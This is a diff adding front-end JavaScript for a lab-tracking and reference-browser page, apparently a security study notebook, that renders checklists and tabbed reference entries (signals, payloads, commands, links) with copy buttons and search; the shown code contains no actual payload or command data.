+  document.getElementById("deleteLab").addEventListener("click", () => deleteLab(lab.id));
+  contentEl.querySelectorAll("#labChecks input[data-step]").forEach(cb => {
+    cb.addEventListener("change", () => {
+      const i = Number(cb.dataset.step);
+      lab.checklist[i] = cb.checked;
+      updateLab(lab.id, { checklist: lab.checklist });
+      const meta = contentEl.querySelector("#labChecks").previousElementSibling.querySelector(".block-meta");
+      if (meta) meta.textContent = lab.checklist.filter(Boolean).length + "/" + LAB_STEPS.length;
+    });
+  });
+  contentEl.querySelectorAll("[data-ref]").forEach(btn => {
+    btn.addEventListener("click", () => openReference(btn.dataset.ref));
+  });
+}
+
+function availableTabs(item) {
+  const tabs = [];
+  if (item.signals) tabs.push(["signals", "Dấu hiệu"]);
+  if (item.tree) tabs.push(["tree", "Decision tree"]);
+  if (item.checklist) tabs.push(["checklist", "Checklist"]);
+  if (item.payloads) tabs.push(["payloads", "Payloads"]);
+  if (item.commands) tabs.push(["commands", "Commands"]);
+  if (item.gotchas) tabs.push(["gotchas", "Gotchas"]);
+  if (item.links) tabs.push(["links", "Links"]);
+  return tabs;
+}
+
+function codeBlock(title, code) {
+  const idx = codeStore.length;
+  codeStore.push(code);
+  return '<div class="code-block"><div class="code-head"><span>' + esc(title) +
+    '</span><button class="copy" type="button" data-idx="' + idx + '">Copy</button></div>' +
+    "<pre><code>" + esc(code) + "</code></pre></div>";
+}
+
+function treeCard(node) {
+  return '<div class="tree-card"><div class="tree-sign">' + inline(node.sign) + "</div>" +
+    '<ul class="tree-actions">' + (node.actions || []).map(a => "<li>" + inline(a) + "</li>").join("") +
+    "</ul></div>";
+}
+
+function drawerBody(item) {
+  codeStore = [];
+  if (refTab === "signals") {
+    return '<div class="chips">' + item.signals.map(s => '<span class="chip">' + inline(s) + "</span>").join("") + "</div>";
+  }
+  if (refTab === "tree") {
+    return '<div class="tree">' + item.tree.map(treeCard).join("") + "</div>";
+  }
+  if (refTab === "checklist") {
+    return item.checklist.map((step, i) => {
+      const key = item.id + ":" + i;
+      return '<label class="check"><input type="checkbox" data-ref-check="' + esc(key) + '"' +
+        (refChecks[key] ? " checked" : "") + "><span>" + inline(step) + "</span></label>";
+    }).join("");
+  }
+  if (refTab === "payloads") {
+    return item.payloads.map(p => codeBlock(p.title, p.code)).join("");
+  }
+  if (refTab === "commands") {
+    return item.commands.map(c => codeBlock(c.title, c.code)).join("");
+  }
+  if (refTab === "gotchas") {
+    return "<ul>" + item.gotchas.map(g => "<li>" + inline(g) + "</li>").join("") + "</ul>";
+  }
+  if (refTab === "links") {
+    return '<div class="links">' + item.links.map(l => '<a href="' + esc(l.url) +
+      '" target="_blank" rel="noopener">' + esc(l.title) + "</a>").join("") + "</div>";
+  }
+  return "";
+}
+
+function renderDrawer() {
+  const old = document.getElementById("refDrawer");
+  const oldBackdrop = document.getElementById("refBackdrop");
+  if (old) old.remove();
+  if (oldBackdrop) oldBackdrop.remove();
+  if (!refItemId || !ITEM_MAP[refItemId]) return;
+
+  const item = ITEM_MAP[refItemId];
+  const section = SECTION_MAP[item.section];
+  const tabs = availableTabs(item);
+  if (!tabs.some(t => t[0] === refTab)) refTab = tabs.length ? tabs[0][0] : null;
+
+  const backdrop = document.createElement("div");
+  backdrop.className = "ref-backdrop";
+  backdrop.id = "refBackdrop";
+  backdrop.addEventListener("click", closeReference);
+
+  const drawer = document.createElement("aside");
+  drawer.className = "ref-drawer";
+  drawer.id = "refDrawer";
+  drawer.setAttribute("role", "dialog");
+  drawer.setAttribute("aria-modal", "true");
+
+  let html = '<div class="ref-head"><div class="ref-head-top"><span class="crumb">Reference / ' +
+    esc(section.title) + '</span><button class="ref-close" type="button" title="Đóng">×</button></div>' +
+    "<h2>" + esc(item.title) + '</h2><p class="summary">' + inline(item.summary || "") + "</p>" +
+    '<div class="tags"><span class="tag ' + esc(item.priority || "") + '">' + esc(item.priority || "low") + "</span>" +
+    (item.tags || []).map(t => '<span class="tag">' + esc(t) + "</span>").join("") + "</div></div>";
+
+  html += '<div class="ref-tabs">' + tabs.map(([id, label]) =>
+    '<button class="ref-tab' + (id === refTab ? " active" : "") + '" type="button" data-ref-tab="' + id + '">' +
+    esc(label) + "</button>").join("") + "</div>";
+  html += '<div class="ref-body" id="refBody">' + drawerBody(item) + "</div>";
+  drawer.innerHTML = html;
+
+  document.body.appendChild(backdrop);
+  document.body.appendChild(drawer);
+
+  drawer.querySelector(".ref-close").addEventListener("click", closeReference);
+  drawer.querySelectorAll("[data-ref-tab]").forEach(btn => {
+    btn.addEventListener("click", () => {
+      refTab = btn.dataset.refTab;
+      renderDrawer();
+    });
+  });
+  drawer.querySelectorAll(".copy").forEach(btn => {
+    btn.addEventListener("click", () => copyText(codeStore[Number(btn.dataset.idx)], btn));
+  });
+  drawer.querySelectorAll("input[data-ref-check]").forEach(cb => {
+    cb.addEventListener("change", () => {
+      const key = cb.dataset.refCheck;
+      if (cb.checked) refChecks[key] = true;
+      else delete refChecks[key];
+      saveRefChecks();
+      renderSidebar();
+    });
+  });
+}
+
+function openReference(id) {
+  if (!ITEM_MAP[id]) return;
+  refItemId = id;
+  const tabs = availableTabs(ITEM_MAP[id]);
+  refTab = tabs.length ? tabs[0][0] : null;
+  renderDrawer();
+  renderSidebar();
+}
+
+function closeReference() {
+  refItemId = null;
+  refTab = null;
+  const d = document.getElementById("refDrawer");
+  const b = document.getElementById("refBackdrop");
+  if (d) d.remove();
+  if (b) b.remove();
+  renderSidebar();
+}
+
+function renderContent() {
+  if (!activeLabId) { renderBoard(); return; }
+  const lab = getLab(activeLabId);
+  if (!lab) { activeLabId = null; renderBoard(); return; }
+  renderLab(lab);
+}
+
+function renderAll() {
+  renderSidebar();
+  renderTabs();
+  renderContent();
+  updateTopProgress();
+}
+
+function bindGlobal() {
+  searchEl.addEventListener("input", renderSidebar);
+  searchEl.addEventListener("keydown", e => {
+    if (e.key === "Enter") {
+      const results = filteredItems();
+      if (results.length) openReference(results[0].id);
+    }
+    if (e.key === "Escape") {
+      searchEl.value = "";
+      searchEl.blur();
+      renderSidebar();
+    }
+  });
+  document.addEventListener("keydown", e => {
+    if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === "k") {
+      e.preventDefault();
+      searchEl.focus();
+      searchEl.select();
+    } else if (e.key === "/" && document.activeElement !== searchEl &&
+      document.activeElement.tagName !== "INPUT" &&
+      document.activeElement.tagName !== "TEXTAREA" &&
+      document.activeElement.tagName !== "SELECT") {
+      e.preventDefault();
+      searchEl.focus();
+    } else if (e.key === "Escape" && refItemId) {
+      closeReference();
+    }
+  });
+  const brand = document.querySelector(".brand");
+  if (brand) {
+    brand.style.cursor = "pointer";
+    brand.addEventListener("click", showBoard);
+  }
+}
+
+bindGlobal();
+renderAll();
+</script>
+</body>
+</html>
